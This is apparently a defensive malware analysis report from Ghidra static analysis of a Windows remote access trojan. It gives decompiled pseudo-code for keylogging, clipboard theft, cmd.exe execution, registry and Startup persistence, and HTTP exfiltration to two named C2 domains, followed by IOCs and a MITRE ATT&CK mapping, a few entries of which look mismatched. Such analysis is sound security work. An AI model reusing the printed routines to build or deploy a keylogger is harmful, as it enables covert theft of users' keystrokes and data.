# Ghidra Static Analysis Findings

## Binary Overview

| Property | Value |
|----------|-------|
| **Architecture** | x64 (AMD64) |
| **Format** | PE (Portable Executable) |
| **Base Address** | 0x140000000 |
| **Compiler** | MinGW-w64 (GCC 9.3-win32 / 10-win32) |
| **Type** | Windows executable |

---

## Phase 1: Triage Summary

### Function Count
- Total functions identified: ~120+
- Entry point: `entry` at 0x1400014d0
- TLS callbacks: 2 (`tls_callback_0`, `tls_callback_1`)

### Memory Segments
| Segment | Address Range | Purpose |
|---------|---------------|---------|
| .text | 0x140001000 - 0x1400111ff | Code |
| .data | 0x140012000 - 0x1400121ff | Initialized data |
| .rdata | 0x140013000 - 0x1400147ff | Read-only data (strings) |
| .idata | 0x140019000 - 0x14001a1ff | Import table |

---

## Phase 2: Suspicious API Imports

### Network Operations (C2 Communication)
| API | Purpose | MITRE ATT&CK |
|-----|---------|--------------|
| `InternetOpenA` | Initialize WinINet session | T1071.001 - Application Layer Protocol: Web Protocols |
| `InternetConnectA` | Connect to C2 server | T1071.001 |
| `HttpOpenRequestA` | Create HTTP request | T1071.001 |
| `HttpSendRequestA` | Send HTTP request with data | T1041 - Exfiltration Over C2 Channel |
| `InternetReadFile` | Read response from C2 | T1071.001 |
| `InternetCloseHandle` | Close connection handles | - |

### Cryptographic Operations
| API | Purpose | MITRE ATT&CK |
|-----|---------|--------------|
| `BCryptOpenAlgorithmProvider` | Open AES encryption provider | T1573 - Encrypted Channel |
| `BCryptSetProperty` | Set chaining mode (ECB) | T1573 |
| `BCryptGenerateSymmetricKey` | Generate encryption key | T1573 |
| `BCryptEncrypt` | Encrypt data before exfiltration | T1573 |
| `BCryptDecrypt` | Decrypt received commands | T1573 |
| `BCryptDestroyKey` | Cleanup encryption key | - |
| `BCryptCloseAlgorithmProvider` | Cleanup provider | - |

### Process Operations
| API | Purpose | MITRE ATT&CK |
|-----|---------|--------------|
| `CreateProcessA` | Execute system commands | T1059 - Command and Scripting Interpreter |
| `CreateThread` | Spawn worker threads | T1059 |
| `CreatePipe` | Create pipes for command I/O | T1059 |
| `ReadFile` | Read command output from pipe | T1059 |
| `WaitForSingleObject` | Wait for process completion | - |

### Registry Operations (Persistence)
| API | Purpose | MITRE ATT&CK |
|-----|---------|--------------|
| `RegCreateKeyExA` | Create registry keys | T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys |
| `RegSetValueExA` | Set registry values for persistence | T1547.001 |
| `RegCloseKey` | Close registry handles | - |

### File Operations
| API | Purpose | MITRE ATT&CK |
|-----|---------|--------------|
| `CopyFileA` | Copy malware to system directories | T1204 - User Execution |
| `CreateDirectoryA` | Create directories for malware | - |
| `DeleteFileA` | Delete files (self-cleanup?) | - |
| `RemoveDirectoryA` | Remove directories | - |
| `FindFirstFileA` / `FindNextFileA` | Directory enumeration | T1083 - File and Directory Discovery |
| `GetFileAttributesA` | Check file existence | - |

### System Information Gathering
| API | Purpose | MITRE ATT&CK |
|-----|---------|--------------|
| `GetComputerNameA` | Get hostname | T1082 - System Information Discovery |
| `GetUserNameA` | Get username | T1082 |
| `GetSystemInfo` | Get CPU/architecture info | T1082 |
| `GlobalMemoryStatusEx` | Get RAM information | T1082 |

### Keylogging / Surveillance
| API | Purpose | MITRE ATT&CK |
|-----|---------|--------------|
| `GetAsyncKeyState` | Capture keystrokes | T1056.001 - Input Capture: Keylogging |
| `GetForegroundWindow` | Get active window | T1113 - Screen Capture |
| `GetWindowTextA` | Get window title | T1113 |
| `OpenClipboard` | Access clipboard | T1115 - Clipboard Data |
| `GetClipboardData` | Read clipboard contents | T1115 |
| `CloseClipboard` | Close clipboard access | - |

### Anti-Analysis / Evasion
| API | Purpose | MITRE ATT&CK |
|-----|---------|--------------|
| `CreateMutexA` | Ensure single instance | T1497 - Virtualization/Sandbox Evasion |
| `GetLastError` | Check mutex existence | T1497 |
| `GetSystemDefaultLCID` | Check locale (Russian check - 0x419) | T1497.001 - System Location Discovery |
| `FreeConsole` | Hide console window | T1564.004 - Hide Artifacts: NTFS File Attributes |
| `Sleep` | Delay execution | T1497 |

---

## Phase 3: Key Function Analysis

### Main Function (`FUN_140003233`)

**Location:** 0x140003233

**Decompiled Code:**
```c
void FUN_140003233(void)
{
  // ... initialization code ...
  
  // Initialize C2 communication
  FUN_14000318b();  // Mutex check
  
  // Establish persistence
  FUN_140002e83();
  
  // Check for existing infections
  FUN_14000221a();
  
  // Hide console
  FreeConsole();
  
  // Collect system info and send to C2
  FUN_1400022bb(...);  // Gather host info
  FUN_1400017b0("/api/info", ...);  // Send to C2
  
  // Create worker thread for C2 communication
  CreateThread(..., &LAB_140002a28, ...);
  
  // Main keylogger loop
  do {
    // Get active window title
    FUN_140001eb5(...);
    
    // Capture keystrokes
    for (key = 8; key < 0x100; key++) {
      if (GetAsyncKeyState(key) & 1) {
        // Process keystroke
      }
    }
    
    // Check clipboard
    FUN_140001fe4(...);
    
    Sleep(100);
  } while (true);
}
```

**Purpose:** Main malware execution loop - initializes C2, establishes persistence, and runs keylogger

---

### C2 Communication Function (`FUN_1400017b0`)

**Location:** 0x1400017b0

**Decompiled Code:**
```c
void FUN_1400017b0(undefined8 param_1, undefined8 param_2, undefined4 param_3)
{
  // Initialize WinINet with Firefox User-Agent
  if (DAT_140017040 == 0) {
    DAT_140017040 = InternetOpenA("Mozilla/5.0", 1, 0, 0, ...);
  }
  
  // Connect to primary C2 server
  uVar1 = InternetConnectA(DAT_140017040, "MiccosoftUpdate.com", 0x50, 0, 0, 3, 0, 0);
  
  // Create HTTP POST request
  uVar2 = HttpOpenRequestA(uVar1, "POST", param_1, "HTTP/1.1", 0, 0, 0, 0);
  
  // Send encrypted data
  HttpSendRequestA(uVar2, "Content-Type: application/octet-stream\r\n", 
                   0xffffffff, param_2, param_3);
  
  // Cleanup
  InternetCloseHandle(uVar2);
  InternetCloseHandle(uVar1);
}
```

**Purpose:** Primary C2 communication channel - sends encrypted data to `MiccosoftUpdate.com`

---

### Secondary C2 Function (`FUN_1400018e7`)

**Location:** 0x1400018e7

**Decompiled Code:**
```c
void FUN_1400018e7(undefined8 param_1, undefined8 param_2, undefined4 param_3)
{
  // Initialize WinINet
  uVar1 = InternetOpenA("Mozilla/5.0", 1, 0, 0, ...);
  
  // Connect to secondary C2 server
  uVar2 = InternetConnectA(uVar1, "windowsupdater.tk", 0x50, 0, 0, 3, 0, 0);
  
  // Create and send HTTP request
  uVar3 = HttpOpenRequestA(uVar2, "POST", param_1, "HTTP/1.1", 0, 0, 0, 0);
  HttpSendRequestA(uVar3, "Content-Type: application/octet-stream\r\n", 
                   0xffffffff, param_2, param_3);
  
  // Cleanup
  InternetCloseHandle(uVar3);
  InternetCloseHandle(uVar2);
  InternetCloseHandle(uVar1);
}
```

**Purpose:** Secondary C2 channel - fallback/exfiltration to `windowsupdater.tk`

---

### Persistence Function (`FUN_140002e83`)

**Location:** 0x140002e83

**Decompiled Code:**
```c
void FUN_140002e83(void)
{
  // Get current executable path
  GetModuleFileNameA((HMODULE)0x0, local_118, 0x104);
  
  // Get AppData path
  SHGetFolderPathA(0, 0x1c, 0, 0, local_228);
  
  // Create %APPDATA%\Microsoft directory
  FUN_140001593((longlong)local_338, 0x104, "%s\\Microsoft", (ulonglong)local_228);
  FUN_140001593((longlong)local_448, 0x104, "%s\\Microsoft\\updater.exe", (ulonglong)local_228);
  CreateDirectoryA(local_338, (LPSECURITY_ATTRIBUTES)0x0);
  
  // Copy malware to %APPDATA%\Microsoft\updater.exe
  CopyFileA(local_118, (LPCSTR)local_448, 0);
  
  // Also copy to Startup folder as msteams.update.exe
  iVar1 = SHGetFolderPathA(0, 7, 0, 0, local_558);
  if (iVar1 == 0) {
    // Append "\msteams.update.exe"
    CopyFileA(local_118, local_558, 0);
  }
  
  // Add to Run registry key
  RegCreateKeyExA(HKEY_CURRENT_USER,
                  "Software\\Microsoft\\Windows\\CurrentVersion\\Run", ...);
  RegSetValueExA(local_560, "MicrosoftUpdater", 0, 1, local_448, ...);
  
  // Add to Task Scheduler registry
  RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MicrosoftUpdater", ...);
  RegSetValueExA(local_568, "Index", 0, 4, local_58c, 4);
}
```

**Purpose:** Establishes multiple persistence mechanisms

---

### Encryption Function (`FUN_140001b8c`)

**Location:** 0x140001b8c

**Decompiled Code:**
```c
undefined8 FUN_140001b8c(undefined8 param_1, undefined8 param_2, undefined8 param_3)
{
  // Derive key from password (first 16 chars)
  memcpy(&stack0x00002058 + lVar1, *(void **)(&stack0x000020b0 + lVar1), (longlong)iVar2);
  
  // Open AES provider
  BCryptOpenAlgorithmProvider((BCRYPT_ALG_HANDLE *)(&stack0x00002070 + lVar1), L"AES", (LPCWSTR)0x0, 0);
  
  // Set ECB mode (INSECURE - no IV)
  BCryptSetProperty(*(BCRYPT_HANDLE *)(&stack0x00002070 + lVar1), L"ChainingMode",
                    (PUCHAR)L"ChainingModeECB", 0x20, ...);
  
  // Generate symmetric key
  BCryptGenerateSymmetricKey(hAlgorithm, (BCRYPT_KEY_HANDLE *)(&stack0x00002068 + lVar1), ...);
  
  // Encrypt data
  BCryptEncrypt(hKey, &stack0x00000058 + lVar1, cbInput, (void *)0x0, ...);
  
  // Cleanup
  BCryptDestroyKey(...);
  BCryptCloseAlgorithmProvider(...);
}
```

**Purpose:** AES-ECB encryption of exfiltrated data (uses password-derived key)

---

### Keylogger Function (Main Loop in `FUN_140003233`)

**Decompiled Code:**
```c
// Main keylogger loop
do {
  // Get active window title
  FUN_140001eb5(&stack0x00000028 + lVar1, 0x100);
  
  // Check if window changed
  iVar5 = strcmp(&stack0x00000028 + lVar1, &stack0x00000328 + lVar1);
  if (iVar5 != 0) {
    // Send window change notification
    FUN_140001593((longlong)(&stack0x00000128 + lVar1), 0x200, "[WINDOW: %s]", ...);
    FUN_140001df3(1, &stack0x00000128 + lVar1, &stack0x00000b28 + lVar1);
  }
  
  // Capture keystrokes (0x08 to 0xFF)
  for (key = 8; key < 0x100; key++) {
    uVar3 = GetAsyncKeyState(key);
    if ((uVar3 & 1) != 0) {
      // Handle special keys (space, enter, tab, backspace)
      // Handle alphanumeric with shift detection
      // Store in buffer
    }
  }
  
  // Check clipboard for changes
  FUN_140001fe4(&stack0x00000b28 + lVar1);
  
  Sleep(100);  // 100ms polling interval
} while (true);
```

**Purpose:** Captures keystrokes, active window titles, and clipboard data

---

### Clipboard Stealer (`FUN_140001fe4`)

**Location:** 0x140001fe4

**Decompiled Code:**
```c
void FUN_140001fe4(undefined8 param_1)
{
  // Read clipboard
  iVar2 = FUN_140001f13(&stack0x00000a10 + lVar1, 0x800);
  
  if (0 < iVar2) {
    // Check if clipboard changed
    iVar2 = strcmp(&stack0x00000a10 + lVar1, &DAT_140017060);
    if (iVar2 != 0) {
      // Format as [CLIPBOARD] content
      FUN_140001593((longlong)(auStackX_10 + lVar1), 0xa00, "[CLIPBOARD] %s", ...);
      
      // Save current clipboard
      strcpy(&DAT_140017060, &stack0x00000a10 + lVar1);
      
      // Send to C2
      FUN_140001df3(1, auStackX_10 + lVar1, *(undefined8 *)(&stack0x00001240 + lVar1));
    }
  }
}
```

**Purpose:** Monitors clipboard and exfiltrates changes

---

### Command Execution (`FUN_1400023e9`)

**Location:** 0x1400023e9

**Decompiled Code:**
```c
void FUN_1400023e9(undefined8 param_1, undefined8 param_2)
{
  // Create pipes for stdout/stderr
  CreatePipe((PHANDLE)(&stack0x00001500 + lVar1), (PHANDLE)(&stack0x000014f8 + lVar1), ...);
  
  // Format command: cmd.exe /c <command>
  FUN_140001593((longlong)(&stack0x00001050 + lVar1), 0x400, "cmd.exe /c %s", ...);
  
  // Execute command
  CreateProcessA((LPCSTR)0x0, &stack0x00001050 + lVar1, ..., &local_148, ...);
  
  // Read output from pipe
  while (true) {
    BVar2 = ReadFile(*(HANDLE *)(&stack0x00001500 + lVar1), ...);
    if ((BVar2 == 0) || (*(int *)(&stack0x0000004c + lVar1) == 0)) break;
  }
  
  // Send output to C2
  FUN_140001e54(3, &stack0x00000050 + lVar1, *(undefined8 *)(&stack0x00001538 + lVar1));
}
```

**Purpose:** Executes arbitrary system commands and returns output to C2

---

### Mutex Check (`FUN_14000318b`)

**Location:** 0x14000318b

**Decompiled Code:**
```c
undefined8 FUN_14000318b(void)
{
  // Create mutex to ensure single instance
  hMutex = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0, 1, "Global\\MicrosoftUpdateMutex");
  
  if (hMutex == (HANDLE)0x0) {
    return 0;  // Failed
  }
  
  // Check if mutex already exists
  DVar1 = GetLastError();
  if (DVar1 == 0xb7) {  // ERROR_ALREADY_EXISTS
    CloseHandle(hMutex);
    return 0;  // Already running
  }
  
  // Check for Russian locale (0x419 = Russian)
  LVar2 = GetSystemDefaultLCID();
  if ((short)LVar2 == 0x419) {
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    return 0;  // Exit on Russian systems
  }
  
  return 1;  // Continue execution
}
```

**Purpose:** Ensures single instance and checks for Russian locale (geofencing)

---

### Base64 Encoding (`FUN_1400015dd`)

**Location:** 0x1400015dd

**Decompiled Code:**
```c
void * FUN_1400015dd(longlong param_1, int param_2)
{
  pvVar4 = malloc((longlong)((param_2 << 2) / 3 + 10));
  
  for (local_10 = 0; local_10 < param_2; local_10 = local_10 + 3) {
    // Base64 encoding using standard alphabet
    uVar3 = uVar3 << 8 | (uint)*(byte *)(param_1 + local_10) << 0x10 | uVar2;
    *(undefined *)((longlong)local_c + (longlong)pvVar4) =
         PTR_s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_140012010[(uint)((int)uVar3 >> 0x12)];
    // ... continue encoding
  }
  return pvVar4;
}
```

**Purpose:** Base64 encoding for data transmission

---

## Phase 4: Strings of Interest

### C2 Domains and URLs
| String | Address | Purpose |
|--------|---------|---------|
| `MiccosoftUpdate.com` | 0x14001300c | Primary C2 server (typosquatting Microsoft) |
| `windowsupdater.tk` | 0x140013059 | Secondary C2 server |
| `/api/data` | 0x14001306b | Data exfiltration endpoint |
| `/update/servicedata` | 0x140013075 | Secondary exfiltration endpoint |
| `/api/info` | 0x14001327d | System info endpoint |
| `/windows/checkforupdate` | 0x140013141 | Command retrieval endpoint |

### File Paths
| String | Address | Purpose |
|--------|---------|---------|
| `%s\Microsoft` | 0x14001318a | Malware directory |
| `%s\Microsoft\updater.exe` | 0x140013197 | Malware copy location |
| `Software\Microsoft\Windows\CurrentVersion\Run` | 0x1400131b0 | Registry Run key |
| `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdater` | 0x1400131f0 | Task Scheduler persistence |

### Identifiers
| String | Address | Purpose |
|--------|---------|---------|
| `MicrosoftUpdater` | 0x1400131de | Registry value name |
| `Global\MicrosoftUpdateMutex` | 0x14001324f | Mutex name |
| `Mozilla/5.0` | 0x140013000 | HTTP User-Agent |

### Format Strings
| String | Address | Purpose |
|--------|---------|---------|
| `Host: %s\nUser: %s\nArch: %s\nCPUs: %lu\nRAM: %llu MB\n` | 0x140013100 | System info format |
| `[CLIPBOARD] %s` | 0x1400130d2 | Clipboard data format |
| `[WINDOW: %s]` | 0x140013287 | Window title format |
| `cmd.exe /c %s` | 0x140013133 | Command execution |
| `"command":` | 0x14001317f | JSON command marker |

### Cryptographic
| String | Address | Purpose |
|--------|---------|---------|
| `ChainingModeECB` | 0x140013098 | AES mode (INSECURE) |
| `ChainingMode` | 0x1400130b8 | BCrypt property |
| `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/` | 0x140013298 | Base64 alphabet |

---

## Phase 5: Identified Capabilities

### 1. Command and Control (C2)
- **Dual C2 servers:** `MiccosoftUpdate.com` and `windowsupdater.tk`
- **Protocol:** HTTP/HTTPS (port 80/443)
- **User-Agent:** Mozilla/5.0 (Firefox spoofing)
- **Endpoints:**
  - `/api/info` - System information upload
  - `/api/data` - Keylogger/clipboard data exfiltration
  - `/update/servicedata` - Secondary exfiltration
  - `/windows/checkforupdate` - Command retrieval

### 2. Keylogging
- Polling interval: 100ms
- Captures: All printable characters, special keys (Enter, Tab, Space, Backspace)
- Shift key detection for case sensitivity
- Window title tracking

### 3. Clipboard Monitoring
- Continuous clipboard polling
- Change detection (avoids duplicates)
- Format: `[CLIPBOARD] <content>`

### 4. Data Encryption
- Algorithm: AES-128/256 (via BCrypt)
- Mode: ECB (INSECURE - no IV, deterministic encryption)
- Key derivation: First 16 characters of password
- Padding: PKCS7-style

### 5. Data Encoding
- Base64 encoding for transmission
- Standard RFC 4648 alphabet

### 6. Persistence Mechanisms
1. **Registry Run Key:**
   - Key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
   - Value: `MicrosoftUpdater`
   - Data: `%APPDATA%\Microsoft\updater.exe`

2. **Startup Folder:**
   - Path: `%STARTUP%\msteams.update.exe`
   - Masquerades as Microsoft Teams update

3. **Task Scheduler Registry:**
   - Key: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdater`

### 7. Anti-Analysis Techniques
- **Mutex:** `Global\MicrosoftUpdateMutex` (single instance)
- **Locale check:** Exits on Russian systems (LCID 0x419)
- **Console hiding:** `FreeConsole()`

### 8. Command Execution
- Shell: `cmd.exe /c <command>`
- Output capture via pipes
- Exfiltration to C2

### 9. Self-Replication
- Copies to `%APPDATA%\Microsoft\updater.exe`
- Copies to Startup folder as `msteams.update.exe`

### 10. Cleanup Capability
- Function `FUN_1400020c7` recursively deletes directories
- May be used for self-deletion or evidence removal

---

## Phase 6: IOCs (Indicators of Compromise)

### Network IOCs
| Type | Value | Notes |
|------|-------|-------|
| Domain | `MiccosoftUpdate.com` | Primary C2 (typosquatting) |
| Domain | `windowsupdater.tk` | Secondary C2 |
| URL | `http://MiccosoftUpdate.com/api/info` | System info exfiltration |
| URL | `http://MiccosoftUpdate.com/api/data` | Keylogger data exfiltration |
| URL | `http://windowsupdater.tk/update/servicedata` | Secondary exfiltration |
| URL | `http://windowsupdater.tk/windows/checkforupdate` | Command retrieval |
| User-Agent | `Mozilla/5.0` | HTTP requests |

### File System IOCs
| Type | Value | Notes |
|------|-------|-------|
| File Path | `%APPDATA%\Microsoft\updater.exe` | Malware copy |
| File Path | `%STARTUP%\msteams.update.exe` | Persistence copy |
| Directory | `%APPDATA%\Microsoft` | Malware directory |

### Registry IOCs
| Type | Value | Notes |
|------|-------|-------|
| Registry Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater` | Persistence |
| Registry Key | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdater` | Task persistence |

### Mutex IOCs
| Type | Value | Notes |
|------|-------|-------|
| Mutex | `Global\MicrosoftUpdateMutex` | Single instance check |

### Process IOCs
| Type | Value | Notes |
|------|-------|-------|
| Process Name | `updater.exe` | Malware process |
| Process Name | `msteams.update.exe` | Alternate name |
| Parent Process | `cmd.exe` | Command execution |

### Behavioral IOCs
| Type | Value | Notes |
|------|-------|-------|
| API Sequence | `InternetOpenA` → `InternetConnectA` → `HttpOpenRequestA` → `HttpSendRequestA` | C2 communication |
| API Sequence | `GetAsyncKeyState` in loop | Keylogging |
| API Sequence | `OpenClipboard` → `GetClipboardData` | Clipboard access |
| API Sequence | `CreatePipe` → `CreateProcessA` → `ReadFile` | Command execution |

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Function |
|--------------|----------------|----------|
| T1056.001 | Input Capture: Keylogging | Main keylogger loop in `FUN_140003233` |
| T1115 | Clipboard Data | `FUN_140001fe4`, `FUN_140001f13` |
| T1059 | Command and Scripting Interpreter | `FUN_1400023e9` |
| T1071.001 | Application Layer Protocol: Web Protocols | `FUN_1400017b0`, `FUN_1400018e7` |
| T1041 | Exfiltration Over C2 Channel | `FUN_140001a1c`, `FUN_140001ad4` |
| T1573 | Encrypted Channel | `FUN_140001b8c` |
| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | `FUN_140002e83` |
| T1082 | System Information Discovery | `FUN_1400022bb` |
| T1083 | File and Directory Discovery | `FUN_1400020c7` |
| T1113 | Screen Capture | Window title capture in keylogger |
| T1497 | Virtualization/Sandbox Evasion | `FUN_14000318b` |
| T1497.001 | System Location Discovery | Russian locale check |
| T1564.004 | Hide Artifacts | `FreeConsole()` |
| T1204 | User Execution | Self-copy to Startup |

---

## Gaps and Areas Needing Further Investigation

1. **Command Retrieval:** The `/windows/checkforupdate` endpoint is referenced but the command parsing logic needs dynamic analysis to understand the command structure

2. **Encryption Key:** The AES encryption uses a password-derived key, but the source of the password is not visible in static analysis

3. **Configuration Data:** There may be embedded configuration or encrypted strings that require dynamic analysis to extract

4. **Network Protocol:** Full C2 protocol specification (command format, response handling) requires network traffic analysis

5. **Self-Update Mechanism:** References to `/update/servicedata` suggest update capability but details unclear

6. **Sandbox Evasion:** Additional anti-analysis techniques may be present but not triggered in static analysis

7. **Data Storage:** Local storage of captured data before exfiltration not fully mapped

---

## Summary

This binary is a **Remote Access Trojan (RAT)** with keylogging capabilities. Key characteristics:

- **Type:** Information stealer / RAT
- **C2:** Dual-domain fallback (MiccosoftUpdate.com, windowsupdater.tk)
- **Capabilities:** Keylogging, clipboard theft, command execution, system information gathering
- **Persistence:** Registry Run key, Startup folder, Task Scheduler
- **Encryption:** AES-ECB (weak)
- **Evasion:** Russian locale check, mutex single-instance, console hiding
- **Masquerading:** Microsoft-themed names (typosquatting, fake Teams update)

**Risk Level:** HIGH - Comprehensive information stealing capability with multiple persistence mechanisms
